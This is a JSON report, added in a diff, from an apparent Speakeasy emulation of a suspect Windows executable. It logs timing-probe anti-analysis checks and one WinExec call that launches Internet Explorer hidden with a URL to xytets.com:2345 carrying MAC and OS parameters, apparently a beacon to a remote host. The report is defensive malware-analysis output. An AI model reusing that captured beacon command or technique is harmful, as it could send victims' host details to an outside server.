@@ -1,0 +1,671 @@
+{
+  "schema_version": 13,
+  "sample": {
+    "path": "/home/lab420/research_on_speakeasy/uncertain_samples_emulation_input/415b1e1060ce9ec6baa2a2545fed371df3513e6f1e48d0f4fb088f77bc96dbe0.exe",
+    "name": "415b1e1060ce9ec6baa2a2545fed371df3513e6f1e48d0f4fb088f77bc96dbe0.exe",
+    "sha256": "d83ee847893ff75e56dca94e338f6f4c8f466e87196629954922450011538adc"
+  },
+  "environment_profile": {
+    "profile_id": "windows-regedit-8b1e39262470",
+    "profile_kind": "exact_system_file_fixture",
+    "guest_path": "C:\\Windows\\regedit.exe",
+    "adds_exact_path_mapping": true,
+    "preserves_default_exe_decoy": true,
+    "fixture": {
+      "host_path": "/home/lab420/research_on_speakeasy/speakeasy_unofficial/speakeasy/resources/windows_exe/regedit.exe",
+      "sha256": "8b1e39262470502c658247dbf1beed6d7703ed3f4ac01e614e36da4fc6fd2c3f",
+      "size": 577536,
+      "provenance": "bundled_speakeasy_resource"
+    },
+    "pe": {
+      "format": "PE",
+      "parse_status": "ok",
+      "architecture": "x64",
+      "machine_hex": "0x8664",
+      "subsystem": "windows_gui",
+      "file_version": "10.0.26100.8328",
+      "minimum_os_version": "10.0",
+      "embedded_authenticode_directory_present": false,
+      "embedded_authenticode_size": 0
+    },
+    "ganelp_content_gate": {
+      "pattern": "M????s??t???n??w",
+      "matched": true,
+      "match_count": 3,
+      "match_offsets": [
+        "0x2f275",
+        "0x39e22",
+        "0x39ee8"
+      ]
+    },
+    "signature": {
+      "embedded_authenticode_present": false,
+      "catalog_signature_status": "not_verified",
+      "note": "Catalog signatures cannot be validated from regedit.exe alone; no signature validation is required for this data-file mapping."
+    },
+    "compatibility": {
+      "speakeasy_default_os": "6.1.7601",
+      "fixture_version_source": "PE metadata",
+      "full_windows_image": false,
+      "note": "Only the requested system file is overlaid. This restores content-dependent branches but does not claim a complete Windows-version-matched environment."
+    }
+  },
+  "run": {
+    "duration_sec": 0.799,
+    "timed_out": false,
+    "api_call_count": 342,
+    "fatal_error": false,
+    "outcome": "ok",
+    "termination_reason": null,
+    "failure_class": null,
+    "gui_message_loop": null,
+    "dotnet_runtime": {
+      "failure_class": null,
+      "message": null,
+      "format_class": "native",
+      "dotnet_format": "native",
+      "evidence_strength": "weak",
+      "detection_source": "static",
+      "detection_reason": "static_clr_context_only",
+      "metadata_valid": null,
+      "entrypoint_resolved": false,
+      "entrypoint_called": false,
+      "runtime_invoked": "false",
+      "dotnet_runtime_invoked": "false",
+      "module": null,
+      "entrypoint": null,
+      "resolved_entrypoint": null,
+      "native_prefix_executed": false,
+      "native_prefix_lost": false,
+      "context_markers": [
+        "corexitprocess",
+        "mscoree.dll"
+      ]
+    },
+    "vb6_runtime": {
+      "status": "available_not_used",
+      "path": "/home/lab420/research_on_speakeasy/essential_dlls/msvbvm60.dll"
+    },
+    "coverage_complete": true,
+    "max_instructions": 300000000,
+    "api_budget_stop": null,
+    "anti_analysis_intercepts": {
+      "GetTickCount": 1,
+      "QueryPerformanceCounter": 1
+    },
+    "errors": [],
+    "runtime_errors": [],
+    "runtime_error_count": 0,
+    "interrupt_count": 0,
+    "interrupt_diagnostics_file": "interrupt_diagnostics.jsonl"
+  },
+  "interrupt_diagnostics": {
+    "schema_version": 1,
+    "file": "interrupt_diagnostics.jsonl",
+    "interrupt_count": 0,
+    "interrupt_numbers": []
+  },
+  "anti_analysis_events": {
+    "schema_version": 2,
+    "ruleset_version": "obvious-v1",
+    "status": "ok",
+    "coverage": {
+      "api_hook_active": true,
+      "emulation_complete": true,
+      "detailed_observations_complete": true,
+      "scope": "registered_api_hook_only",
+      "known_blind_spots": [
+        "direct_peb_access",
+        "direct_syscall",
+        "inline_anti_debug"
+      ]
+    },
+    "summary": {
+      "observation_count": 2,
+      "stored_observation_count": 2,
+      "dropped_observation_count": 0,
+      "cluster_count": 0,
+      "by_family": {
+        "timing_probe": 2
+      },
+      "by_probe_key": {
+        "GetTickCount": 1,
+        "QueryPerformanceCounter": 1
+      },
+      "by_api": {
+        "GetTickCount": 1,
+        "QueryPerformanceCounter": 1
+      },
+      "evidence_roles": {
+        "primary_debug_probe": {
+          "observation_count": 0,
+          "sample_count": 0,
+          "by_family": {},
+          "by_probe_key": {},
+          "by_api": {}
+        },
+        "supporting_timing_environment": {
+          "observation_count": 2,
+          "sample_count": 1,
+          "by_family": {
+            "timing_probe": 2
+          },
+          "by_probe_key": {
+            "GetTickCount": 1,
+            "QueryPerformanceCounter": 1
+          },
+          "by_api": {
+            "GetTickCount": 1,
+            "QueryPerformanceCounter": 1
+          }
+        },
+        "debug_channel": {
+          "observation_count": 0,
+          "sample_count": 0,
+          "by_family": {},
+          "by_probe_key": {},
+          "by_api": {}
+        }
+      },
+      "signal_assessment": "supporting_signal_only",
+      "readable": {
+        "primary_debug_probe_observed": false,
+        "supporting_timing_environment_observed": true,
+        "debug_channel_observed": false,
+        "cluster_observed": false,
+        "coverage_complete": true
+      },
+      "truncated": false
+    },
+    "observations": [
+      {
+        "observation_id": "aa-000001",
+        "observation_seq": 56,
+        "call_index": 4,
+        "api": "kernel32.GetTickCount",
+        "short_api": "GetTickCount",
+        "family": "timing_probe",
+        "evidence_role": "supporting_timing_environment",
+        "subtype": "tick_count",
+        "probe_key": "GetTickCount",
+        "selector": null,
+        "context": {
+          "process_id": 1056,
+          "thread_id": 1076,
+          "pc": "0xfeedf04c",
+          "pc_location": null,
+          "caller_pc": null,
+          "return_address": "0x406206",
+          "caller_location": null,
+          "caller_key": "1056:1076:return:0x406206",
+          "thread_key": "1056:1076",
+          "association_quality": "return_address_only"
+        },
+        "result": {
+          "intercepted": true,
+          "return_value": "0x6ddf76"
+        },
+        "details": {}
+      },
+      {
+        "observation_id": "aa-000002",
+        "observation_seq": 57,
+        "call_index": 5,
+        "api": "kernel32.QueryPerformanceCounter",
+        "short_api": "QueryPerformanceCounter",
+        "family": "timing_probe",
+        "evidence_role": "supporting_timing_environment",
+        "subtype": "performance_counter",
+        "probe_key": "QueryPerformanceCounter",
+        "selector": null,
+        "context": {
+          "process_id": 1056,
+          "thread_id": 1076,
+          "pc": "0xfeedf104",
+          "pc_location": null,
+          "caller_pc": null,
+          "return_address": "0x406212",
+          "caller_location": null,
+          "caller_key": "1056:1076:return:0x406212",
+          "thread_key": "1056:1076",
+          "association_quality": "return_address_only"
+        },
+        "result": {
+          "intercepted": true,
+          "return_value": "0x1"
+        },
+        "details": {}
+      }
+    ],
+    "signature_groups": [
+      {
+        "signature": "timing_probe|GetTickCount|||0x6ddf76",
+        "occurrence_count": 1,
+        "first_call_index": 4,
+        "last_call_index": 4,
+        "representative_observation_ids": [
+          "aa-000001"
+        ]
+      },
+      {
+        "signature": "timing_probe|QueryPerformanceCounter|||0x1",
+        "occurrence_count": 1,
+        "first_call_index": 5,
+        "last_call_index": 5,
+        "representative_observation_ids": [
+          "aa-000002"
+        ]
+      }
+    ],
+    "clusters": [],
+    "gaps": [],
+    "errors": []
+  },
+  "network_events": {
+    "schema_version": 2,
+    "ruleset_version": "obvious-network-v1",
+    "detector": "obvious-network-v2",
+    "status": "ok",
+    "coverage": {
+      "ip_version": 4,
+      "api_hook_active": true,
+      "emulation_complete": true,
+      "complete": true,
+      "scope": "registered_ipv4_api_hook_only",
+      "self_contained": true,
+      "cross_detector_correlations": false,
+      "support_status": "bounded_observation_not_packet_capture",
+      "output_policy": {
+        "default_finding_kinds": [
+          "download_then_execute",
+          "suspected_c2_session"
+        ],
+        "single_connection_findings": false,
+        "minimum_c2_completed_rounds": 3
+      },
+      "known_blind_spots": [
+        "wsa_connect_unimplemented",
+        "wsa_send_recv_unimplemented",
+        "sendto_unimplemented",
+        "internet_write_file_unimplemented",
+        "shell_execute_ex_struct_unimplemented",
+        "url_download_requires_argument_adapter",
+        "tls_application_data_unavailable",
+        "direct_syscall_or_custom_protocol"
+      ],
+      "config": {
+        "max_detailed_observations": 512,
+        "max_reported_observations": 64,
+        "max_endpoints": 256,
+        "max_sessions": 128,
+        "download_execution_window_calls": 256,
+        "evidence_correlation_window_calls": 128
+      }
+    },
+    "summary": {
+      "status": "ok",
+      "network_observation_count": 0,
+      "observation_count": 0,
+      "stored_observation_count": 0,
+      "reported_observation_count": 0,
+      "omitted_observation_count": 0,
+      "unique_endpoint_count": 0,
+      "omitted_endpoint_count": 0,
+      "session_count": 0,
+      "omitted_session_count": 0,
+      "download_call_count": 0,
+      "supporting_execution_reference_count": 7,
+      "stored_execution_reference_count": 7,
+      "execution_reference_count": 7,
+      "omitted_execution_reference_count": 0,
+      "supporting_file_write_count": 0,
+      "omitted_supporting_file_write_count": 0,
+      "outbound_bytes": 0,
+      "inbound_bytes": 0,
+      "finding_count": 0,
+      "finding_kinds": {},
+      "finding_strengths": {},
+      "by_category": {},
+      "by_api": {},
+      "by_status": {},
+      "readable": {
+        "download_then_execute_observed": false,
+        "suspected_c2_session_observed": false,
+        "coverage_complete": true
+      }
+    },
+    "endpoints": [],
+    "sessions": [],
+    "observations": [],
+    "supporting_execution": {
+      "reference_count": 7,
+      "stored_reference_count": 7,
+      "omitted_reference_count": 0,
+      "matched_reference_count": 0,
+      "unmatched_reference_count": 7,
+      "by_api": {
+        "LoadLibraryW": 6,
+        "WinExec": 1
+      },
+      "by_status": {
+        "success": 7
+      },
+      "truncated": false
+    },
+    "findings": [],
+    "gaps": [],
+    "errors": []
+  },
+  "registry_events": {
+    "schema_version": 1,
+    "ruleset_version": "registry-behavior-v1",
+    "detector": "regedit_related_behavior",
+    "status": "ok",
+    "summary": {
+      "read_target_count": 0,
+      "omitted_read_target_count": 0,
+      "read_call_count": 0,
+      "enumerate_call_count": 0,
+      "mutation_count": 0,
+      "stored_mutation_count": 0,
+      "omitted_mutation_count": 0,
+      "mutation_succeeded_count": 0,
+      "mutation_failed_count": 0,
+      "mutation_no_change_count": 0,
+      "mutation_effect_unknown_count": 0,
+      "finding_count": 0,
+      "by_operation": {}
+    },
+    "read_targets": [],
+    "mutations": [],
+    "findings": [],
+    "coverage": {
+      "api_hook_active": true,
+      "emulation_complete": true,
+      "read_supported": true,
+      "value_write_supported": true,
+      "value_delete_supported": true,
+      "key_delete_supported": false,
+      "before_state_available": true,
+      "after_state_available": true,
+      "complete": true,
+      "known_blind_spots": [
+        "RegDeleteKey handler unavailable",
+        "direct system calls",
+        "offline registry hives"
+      ]
+    },
+    "gaps": [],
+    "errors": []
+  },
+  "suspicious_shell_events": {
+    "schema_version": 1,
+    "ruleset_version": "suspicious-shell-v1",
+    "detector": "suspicious_shell",
+    "status": "ok",
+    "coverage": {
+      "api_hook_active": true,
+      "emulation_complete": true,
+      "complete": true,
+      "child_coverage": "request_only",
+      "known_blind_spots": [
+        "child_process_not_executed_by_engine",
+        "command_line_static_analysis_only",
+        "shell_execute_ex_structure_may_be_unreadable",
+        "direct_system_calls",
+        "coverage_limited_samples",
+        "short_path_aliases_not_resolved"
+      ]
+    },
+    "summary": {
+      "launch_count": 1,
+      "stored_launch_count": 1,
+      "omitted_launch_count": 0,
+      "process_object_created_count": 1,
+      "child_started_count": 0,
+      "child_emulated_count": 0,
+      "shell_launch_count": 0,
+      "shell_interpreter_launch_count": 0,
+      "execution_proxy_launch_count": 0,
+      "browser_or_url_launch_count": 1,
+      "dropped_artifact_launch_count": 0,
+      "unknown_process_launch_count": 0,
+      "parsed_launch_count": 1,
+      "malformed_launch_count": 0,
+      "command_truncated_launch_count": 0,
+      "command_chars_observed": 102,
+      "command_chars_retained": 102,
+      "review_signal_count": 1,
+      "sample_with_review_signal": 1,
+      "review_signals_by_kind": {
+        "url_launch": 1
+      },
+      "sample_with_shell_observation": 0,
+      "finding_count": 0,
+      "sample_with_finding": 0,
+      "finding_occurrence_count": 0,
+      "deduped_finding_count": 0,
+      "omitted_finding_count": 0,
+      "finding_kinds": {},
+      "finding_rules": {},
+      "by_rule": {},
+      "findings_by_scope": {},
+      "findings_by_behavior_scope": {},
+      "by_shell_family": {
+        "browser": 1
+      },
+      "by_behavior_scope": {
+        "browser_or_url": 1
+      },
+      "by_launch_status": {
+        "success_request": 1
+      },
+      "by_coverage": {
+        "command_line_only": 1
+      },
+      "truncated_launch_count": 0,
+      "findings_per_finding_sample": 0,
+      "review_signal_to_finding_ratio": null
+    },
+    "launches": [
+      {
+        "launch_id": "launch-000341",
+        "kind": "process_execution",
+        "api_name": "kernel32.WinExec",
+        "launch_api": "WinExec",
+        "operation": null,
+        "shell_family": "browser",
+        "target_identity": "iexplore",
+        "target_behavior_scope": "browser_or_url",
+        "behavior_scope": "browser_or_url",
+        "shell_relevance": "not_shell",
+        "is_shell_interpreter": false,
+        "is_execution_proxy": false,
+        "is_browser_or_url": true,
+        "behavior_scope_basis": "browser_or_uri_target",
+        "target": "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+        "raw_target": "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+        "normalized_target": "c:\\program files\\internet explorer\\iexplore.exe",
+        "is_uri": false,
+        "is_uri_target": false,
+        "contains_unresolved_env": false,
+        "application_name": null,
+        "create_process_command_line": null,
+        "shell_file": null,
+        "shell_parameters": null,
+        "shell_directory": null,
+        "winexec_command_line": "C:\\Program Files\\Internet Explorer\\iexplore.exe http://xytets.com:2345/t.asp?ver=xxx&mac=0-0-0-0&os=vm",
+        "application_target": null,
+        "commandline_target": "c:\\program files\\internet explorer\\iexplore.exe",
+        "application_commandline_mismatch": false,
+        "command_line": "C:\\Program Files\\Internet Explorer\\iexplore.exe http://xytets.com:2345/t.asp?ver=xxx&mac=0-0-0-0&os=vm",
+        "command_line_preview": "C:\\Program Files\\Internet Explorer\\iexplore.exe http://xytets.com:2345/t.asp?ver=xxx&mac=0-0-0-0&os=vm",
+        "command_line_head": null,
+        "command_line_tail": null,
+        "command_length": 102,
+        "command_truncated": false,
+        "command_gap": null,
+        "command_sha256": "a6b90cfa1c7692906f2cf02648d500ebb58ffb5fff2fa06ba9b2d6d360b8dbb3",
+        "command_sha256_basis": "complete_command",
+        "creation_flags": [],
+        "command_flags": [],
+        "window_flags": [
+          "SW_HIDE"
+        ],
+        "all_flags": [
+          "SW_HIDE"
+        ],
+        "flags": [
+          "SW_HIDE"
+        ],
+        "raw_flags": [
+          "SW_HIDE"
+        ],
+        "api_field_truncations": [],
+        "workdir": "",
+        "working_directory": "",
+        "show_command": 0,
+        "parsed": {
+          "flags": [],
+          "command_mode": "none",
+          "script_text_preview": "C:\\Program Files\\Internet Explorer\\iexplore.exe http://xytets.com:2345/t.asp?ver=xxx&mac=0-0-0-0&os=vm",
+          "urls": [
+            "http://xytets.com:2345/t.asp?ver=xxx&mac=0-0-0-0&os=vm"
+          ],
+          "decoded": {
+            "decode_status": "not_applicable",
+            "decoded_preview": "",
+            "decoded_urls": []
+          },
+          "features": {
+            "download_construct": false,
+            "download_execute_chain": false,
+            "execution_construct": true,
+            "dynamic_invocation": false,
+            "obfuscation_construct": false,
+            "remote_script_host": false,
+            "remote_script_uri": null,
+            "nested_shell_names": [],
+            "nested_shells": [],
+            "execution_targets": [
+              "C:\\Program"
+            ],
+            "environment_probe": false
+          }
+        },
+        "call_index": 341,
+        "pid": 1056,
+        "tid": 1076,
+        "parent": {
+          "pid": 1056,
+          "name": "415b1e1060ce9ec6baa2a2545fed371df3513e6f1e48d0f4fb088f77bc96dbe0.exe"
+        },
+        "context": {
+          "observation_index": 393,
+          "pc": 4277006384,
+          "return_address": 4205434,
+          "thread_id": 1076,
+          "process_id": 1056
+        },
+        "launch_result": "success_request",
+        "api_result": 32,
+        "process_object_created": true,
+        "child_pid": null,
+        "child_started": false,
+        "child_emulated": false,
+        "child_traced": false,
+        "coverage": "command_line_only",
+        "truncated": false,
+        "parse_status": "parsed",
+        "self_relaunch": false,
+        "target_not_under_system_dir": false,
+        "review_signals": [
+          {
+            "kind": "url_launch",
+            "source": "shell_execute",
+            "strength": "weak"
+          }
+        ],
+        "evidence_refs": []
+      }
+    ],
+    "findings": [],
+    "gaps": [],
+    "errors": []
+  },
+  "shellcode_events": {
+    "schema_version": 4,
+    "summary": {
+      "tracked_region_count": 0,
+      "reported_region_count": 0,
+      "executed_non_image": 0,
+      "prepared_exec": 0,
+      "data_only": 0,
+      "image_like": 0,
+      "executed_code_count": 0,
+      "shellcode_candidate_count": 0,
+      "runtime_dispatch_thunk_count": 0,
+      "unknown_dynamic_code_count": 0,
+      "semantic_classification_counts": {},
+      "strong_evidence_count": 0,
+      "filtered_low_signal_count": 0,
+      "candidate_chain_count": 0,
+      "candidate_classification_counts": {},
+      "candidate_semantic_classification_counts": {},
+      "aggregated_duplicate_region_count": 0,
+      "snapshot_candidate_count": 0,
+      "event_aggregation": {
+        "raw_observations": 0,
+        "unique_signatures": 0,
+        "deduplicated_observations": 0,
+        "serialized_events": 0,
+        "omitted_signatures": 0
+      },
+      "execution_intent": {
+        "regions_with_context": 0,
+        "complete_regions": 0,
+        "executed_regions": 0,
+        "executed_complete_regions": 0,
+        "executed_with_source": 0,
+        "executed_with_write": 0,
+        "executed_with_protection_or_direct_exec": 0,
+        "executed_with_entry_context": 0,
+        "entry_offset_violations": 0,
+        "write_sources": {},
+        "external_thread_entries": 0,
+        "external_thread_entries_linked": 0
+      }
+    },
+    "regions": [],
+    "external_thread_entries": []
+  },
+  "dropped_executable_events": {
+    "schema_version": 1,
+    "summary": {
+      "status": "ok",
+      "observed_write_call_count": 0,
+      "observed_file_write_count": 0,
+      "ignored_non_file_write_count": 0,
+      "unknown_write_sink_count": 0,
+      "write_sink_counts": {},
+      "resolved_file_count": 0,
+      "candidate_file_count": 0,
+      "complete_candidate_count": 0,
+      "partial_candidate_count": 0,
+      "empty_candidate_file_count": 0,
+      "orphan_write_count": 0,
+      "captured_bytes": 0,
+      "ignored_network_write_count": 0,
+      "file_operation_counts": {},
+      "unresolved_file_operation_count": 0,
+      "coverage_complete": true
+    },
+    "files": [],
+    "orphan_writes": [],
+    "unresolved_file_operations": [],
+    "errors": [],
+    "manifest_file": "dropped_executable_manifest.jsonl"
+  },
+  "relevant_api_trace": [],
+  "environment_observations": []
+}
